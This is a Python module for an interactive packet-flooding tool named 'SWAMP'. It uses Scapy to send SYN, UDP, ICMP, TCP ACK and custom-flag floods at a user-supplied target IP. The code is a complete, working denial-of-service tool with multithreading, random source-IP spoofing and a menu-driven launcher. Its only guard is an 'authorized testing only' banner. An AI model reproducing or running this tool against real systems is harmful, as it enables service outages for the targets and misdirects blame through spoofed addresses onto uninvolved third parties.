"""
SWAMP Module - Advanced Packet Flooding using Scapy

This module provides multiple flooding attack types using the Scapy library,
which offers more features and capabilities than hping3:
- SYN Flood: TCP SYN packet flooding
- UDP Flood: UDP packet flooding  
- ICMP Flood: ICMP echo request flooding
- TCP ACK Flood: TCP ACK packet flooding
- Custom Packet Flood: Custom TCP flag combinations

Features:
- Multiple attack types
- Configurable packet count, size, and target port
- Random source IP spoofing option
- Multi-threaded flooding for higher performance
- Real-time progress feedback and statistics
- Graceful interruption handling

Note: This tool requires root/sudo privileges to send raw packets.
For authorized security testing purposes only.
"""

import random
import threading
import time
import sys
from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandShort, RandIP, conf

# Suppress Scapy warnings
conf.verb = 0

# Default payload sizes (in bytes)
DEFAULT_UDP_PAYLOAD_SIZE = 64
DEFAULT_ICMP_PAYLOAD_SIZE = 56
DEFAULT_TCP_PAYLOAD_SIZE = 64

# Global variables for statistics
packets_sent = 0
stop_flood = False
lock = threading.Lock()


def generate_random_ip():
    """Generate a random IP address for source spoofing."""
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


def create_ip_layer(target_ip, spoof_ip):
    """
    Create IP layer with optional source spoofing.
    
    Args:
        target_ip: Target IP address
        spoof_ip: Whether to use random source IP
    
    Returns:
        Scapy IP layer
    """
    if spoof_ip:
        return IP(src=generate_random_ip(), dst=target_ip)
    return IP(dst=target_ip)


def create_tcp_layer(target_port, flags="S", include_ack=False):
    """
    Create TCP layer with specified flags.
    
    Args:
        target_port: Target port number
        flags: TCP flags string
        include_ack: Whether to include random ACK number
    
    Returns:
        Scapy TCP layer
    """
    src_port = random.randint(1024, 65535)
    seq_num = random.randint(0, 2**32-1)
    
    if include_ack:
        ack_num = random.randint(0, 2**32-1)
        return TCP(sport=src_port, dport=target_port, flags=flags, seq=seq_num, ack=ack_num)
    return TCP(sport=src_port, dport=target_port, flags=flags, seq=seq_num)


def syn_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, thread_id):
    """
    Perform SYN flood attack using TCP SYN packets.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        pkt_count: Number of packets to send per thread
        pkt_size: Payload size in bytes
        spoof_ip: Whether to use random source IPs
        thread_id: Thread identifier for logging
    """
    global packets_sent, stop_flood
    
    payload = Raw(b"X" * pkt_size) if pkt_size > 0 else None
    
    for i in range(pkt_count):
        if stop_flood:
            break
        
        ip_layer = create_ip_layer(target_ip, spoof_ip)
        tcp_layer = create_tcp_layer(target_port, flags="S")
        pkt = ip_layer / tcp_layer
        
        if payload:
            pkt = pkt / payload
        
        send(pkt, verbose=False)
        
        with lock:
            packets_sent += 1


def udp_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, thread_id):
    """
    Perform UDP flood attack.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        pkt_count: Number of packets to send per thread
        pkt_size: Payload size in bytes
        spoof_ip: Whether to use random source IPs
        thread_id: Thread identifier for logging
    """
    global packets_sent, stop_flood
    
    payload = Raw(b"U" * pkt_size) if pkt_size > 0 else Raw(b"U" * DEFAULT_UDP_PAYLOAD_SIZE)
    
    for i in range(pkt_count):
        if stop_flood:
            break
        
        ip_layer = create_ip_layer(target_ip, spoof_ip)
        src_port = random.randint(1024, 65535)
        pkt = ip_layer / UDP(sport=src_port, dport=target_port) / payload
        
        send(pkt, verbose=False)
        
        with lock:
            packets_sent += 1


def icmp_flood(target_ip, pkt_count, pkt_size, spoof_ip, thread_id):
    """
    Perform ICMP flood attack (ping flood).
    
    Args:
        target_ip: Target IP address
        pkt_count: Number of packets to send per thread
        pkt_size: Payload size in bytes
        spoof_ip: Whether to use random source IPs
        thread_id: Thread identifier for logging
    """
    global packets_sent, stop_flood
    
    payload = Raw(b"P" * pkt_size) if pkt_size > 0 else Raw(b"P" * DEFAULT_ICMP_PAYLOAD_SIZE)
    
    for i in range(pkt_count):
        if stop_flood:
            break
        
        ip_layer = create_ip_layer(target_ip, spoof_ip)
        pkt = ip_layer / ICMP(type=8, code=0) / payload
        
        send(pkt, verbose=False)
        
        with lock:
            packets_sent += 1


def tcp_ack_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, thread_id):
    """
    Perform TCP ACK flood attack.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        pkt_count: Number of packets to send per thread
        pkt_size: Payload size in bytes
        spoof_ip: Whether to use random source IPs
        thread_id: Thread identifier for logging
    """
    global packets_sent, stop_flood
    
    payload = Raw(b"A" * pkt_size) if pkt_size > 0 else None
    
    for i in range(pkt_count):
        if stop_flood:
            break
        
        ip_layer = create_ip_layer(target_ip, spoof_ip)
        tcp_layer = create_tcp_layer(target_port, flags="A", include_ack=True)
        pkt = ip_layer / tcp_layer
        
        if payload:
            pkt = pkt / payload
        
        send(pkt, verbose=False)
        
        with lock:
            packets_sent += 1


def custom_tcp_flood(target_ip, target_port, pkt_count, pkt_size, spoof_ip, tcp_flags, thread_id):
    """
    Perform custom TCP flood with specified flags.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        pkt_count: Number of packets to send per thread
        pkt_size: Payload size in bytes
        spoof_ip: Whether to use random source IPs
        tcp_flags: TCP flags string (e.g., "SA", "FA", "R")
        thread_id: Thread identifier for logging
    """
    global packets_sent, stop_flood
    
    payload = Raw(b"C" * pkt_size) if pkt_size > 0 else None
    # Include ACK number if ACK flag is present
    include_ack = "A" in tcp_flags.upper()
    
    for i in range(pkt_count):
        if stop_flood:
            break
        
        ip_layer = create_ip_layer(target_ip, spoof_ip)
        tcp_layer = create_tcp_layer(target_port, flags=tcp_flags, include_ack=include_ack)
        pkt = ip_layer / tcp_layer
        
        if payload:
            pkt = pkt / payload
        
        send(pkt, verbose=False)
        
        with lock:
            packets_sent += 1


def progress_monitor(total_packets):
    """Monitor and display flooding progress."""
    global packets_sent, stop_flood
    
    start_time = time.time()
    
    while not stop_flood and packets_sent < total_packets:
        elapsed = time.time() - start_time
        rate = packets_sent / elapsed if elapsed > 0 else 0
        progress = (packets_sent / total_packets) * 100 if total_packets > 0 else 0
        
        sys.stdout.write(f"\r\033[36m[Progress] Packets sent: {packets_sent}/{total_packets} ({progress:.1f}%) | Rate: {rate:.0f} pkt/s\033[0m")
        sys.stdout.flush()
        time.sleep(0.5)
    
    elapsed = time.time() - start_time
    rate = packets_sent / elapsed if elapsed > 0 else 0
    print(f"\n\033[32m[Complete] Total packets sent: {packets_sent} | Duration: {elapsed:.2f}s | Average rate: {rate:.0f} pkt/s\033[0m")


def flood_pkt(target_ip, attack_type, pkt_count, pkt_size, target_port=80, spoof_ip=False, num_threads=4, tcp_flags="S"):
    """
    Main flooding function that coordinates the attack.
    
    Args:
        target_ip: Target IP address
        attack_type: Type of attack (1=SYN, 2=UDP, 3=ICMP, 4=TCP ACK, 5=Custom TCP)
        pkt_count: Total number of packets to send
        pkt_size: Payload size in bytes
        target_port: Target port for TCP/UDP attacks
        spoof_ip: Whether to use random source IP addresses
        num_threads: Number of threads to use
        tcp_flags: TCP flags for custom TCP flood
    """
    global packets_sent, stop_flood
    packets_sent = 0
    stop_flood = False
    
    attack_names = {
        1: "SYN Flood",
        2: "UDP Flood", 
        3: "ICMP Flood",
        4: "TCP ACK Flood",
        5: "Custom TCP Flood"
    }
    
    print(f"\n\033[36m{'='*60}")
    print(f" Starting {attack_names.get(attack_type, 'Unknown')} Attack")
    print(f"{'='*60}")
    print(f" Target IP: {target_ip}")
    if attack_type != 3:
        print(f" Target Port: {target_port}")
    print(f" Total Packets: {pkt_count}")
    print(f" Packet Size: {pkt_size} bytes")
    print(f" IP Spoofing: {'Enabled' if spoof_ip else 'Disabled'}")
    print(f" Threads: {num_threads}")
    if attack_type == 5:
        print(f" TCP Flags: {tcp_flags}")
    print(f"{'='*60}\033[0m")
    print("\n\033[33m[!] Press Ctrl+C to stop the attack\033[0m\n")
    
    try:
        threads = []
        packets_per_thread = pkt_count // num_threads
        
        # Start progress monitor thread
        monitor_thread = threading.Thread(target=progress_monitor, args=(pkt_count,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start attack threads
        for i in range(num_threads):
            if attack_type == 1:
                t = threading.Thread(target=syn_flood, args=(target_ip, target_port, packets_per_thread, pkt_size, spoof_ip, i))
            elif attack_type == 2:
                t = threading.Thread(target=udp_flood, args=(target_ip, target_port, packets_per_thread, pkt_size, spoof_ip, i))
            elif attack_type == 3:
                t = threading.Thread(target=icmp_flood, args=(target_ip, packets_per_thread, pkt_size, spoof_ip, i))
            elif attack_type == 4:
                t = threading.Thread(target=tcp_ack_flood, args=(target_ip, target_port, packets_per_thread, pkt_size, spoof_ip, i))
            elif attack_type == 5:
                t = threading.Thread(target=custom_tcp_flood, args=(target_ip, target_port, packets_per_thread, pkt_size, spoof_ip, tcp_flags, i))
            else:
                print(f"\033[31m[Error] Invalid attack type: {attack_type}\033[0m")
                return
            
            threads.append(t)
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Wait for monitor to finish
        stop_flood = True
        time.sleep(1)
        
    except KeyboardInterrupt:
        print("\n\n\033[31m[!] Attack stopped by user (Ctrl+C)\033[0m")
        stop_flood = True
        time.sleep(1)
    except PermissionError:
        print("\n\033[31m[Error] Permission denied. Please run with sudo/root privileges.\033[0m")
    except OSError as e:
        print(f"\n\033[31m[Error] Network error: {e}\033[0m")
    finally:
        print("\n\033[36m[*] Flood attack terminated\033[0m")


def show_attack_menu():
    """Display attack type selection menu."""
    print("\n\033[36mSelect Attack Type:")
    print("  1. SYN Flood      - TCP SYN packet flooding (most common)")
    print("  2. UDP Flood      - UDP packet flooding")
    print("  3. ICMP Flood     - ICMP echo request flooding (ping flood)")
    print("  4. TCP ACK Flood  - TCP ACK packet flooding")
    print("  5. Custom TCP     - Custom TCP flags combination")
    print("  6. Back to main menu\033[0m")


def get_valid_int(prompt, min_val=1, max_val=None, default=None):
    """Get and validate integer input."""
    while True:
        try:
            user_input = input(prompt).strip()
            if user_input == "" and default is not None:
                return default
            value = int(user_input)
            if value < min_val:
                print(f"\033[31m[!] Value must be at least {min_val}\033[0m")
                continue
            if max_val and value > max_val:
                print(f"\033[31m[!] Value must be at most {max_val}\033[0m")
                continue
            return value
        except ValueError:
            print("\033[31m[!] Please enter a valid number\033[0m")


def get_yes_no(prompt, default='n'):
    """Get yes/no input."""
    while True:
        user_input = input(prompt).strip().lower()
        if user_input == "":
            return default == 'y'
        if user_input in ['y', 'yes']:
            return True
        if user_input in ['n', 'no']:
            return False
        print("\033[31m[!] Please enter 'y' or 'n'\033[0m")


def collect():
    """Main function to collect attack parameters from user."""
    art = '''
 ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓█████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
                                                                                 
    Advanced Packet Flooding Tool (Powered by Scapy)
    '''
    print(f"\033[91m{art}\033[0m")
    
    print("\n\033[33m[!] WARNING: This tool is for authorized security testing only!")
    print("[!] Unauthorized use against systems you don't own is illegal.\033[0m\n")
    
    # Get target IP
    target_ip = input("\033[36m[*] Enter target IP address: \033[0m").strip()
    if not target_ip:
        print("\033[31m[!] Target IP is required\033[0m")
        return
    
    while True:
        show_attack_menu()
        attack_type = get_valid_int("\n\033[36m[*] Select attack type (1-6): \033[0m", 1, 6)
        
        if attack_type == 6:
            print("\033[36m[*] Returning to main menu...\033[0m")
            return
        
        # Get target port (not needed for ICMP)
        target_port = 80
        if attack_type != 3:
            target_port = get_valid_int("\033[36m[*] Enter target port (default 80): \033[0m", 1, 65535, default=80)
        
        # Get packet count
        pkt_count = get_valid_int("\033[36m[*] Number of packets to send (default 10000): \033[0m", 1, default=10000)
        
        # Get packet size
        pkt_size = get_valid_int("\033[36m[*] Packet payload size in bytes (default 64, max 1400): \033[0m", 0, 1400, default=64)
        
        # Get number of threads
        num_threads = get_valid_int("\033[36m[*] Number of threads (default 4, max 16): \033[0m", 1, 16, default=4)
        
        # IP spoofing option
        spoof_ip = get_yes_no("\033[36m[*] Enable random source IP spoofing? (y/N): \033[0m", default='n')
        
        # Custom TCP flags for option 5
        tcp_flags = "S"
        if attack_type == 5:
            print("\n\033[36m Available TCP flags: S(SYN), A(ACK), F(FIN), R(RST), P(PUSH), U(URG)")
            tcp_flags = input("[*] Enter TCP flags combination (default 'S'): \033[0m").strip().upper()
            if not tcp_flags:
                tcp_flags = "S"
            # Validate flags
            valid_flags = set("SAFPRU")
            if not all(c in valid_flags for c in tcp_flags):
                print("\033[31m[!] Invalid flags. Using default 'S'\033[0m")
                tcp_flags = "S"
        
        # Confirmation
        print(f"\n\033[33m[!] Ready to launch attack against {target_ip}")
        confirm = get_yes_no("[!] Do you want to proceed? (y/N): \033[0m", default='n')
        
        if confirm:
            flood_pkt(target_ip, attack_type, pkt_count, pkt_size, target_port, spoof_ip, num_threads, tcp_flags)
        else:
            print("\033[36m[*] Attack cancelled\033[0m")
        
        # Ask if user wants to continue
        continue_attack = get_yes_no("\n\033[36m[*] Launch another attack? (y/N): \033[0m", default='n')
        if not continue_attack:
            break
    
    print("\n\033[36m[*] Exiting SWAMP module\033[0m")


if __name__ == '__main__':
    collect()
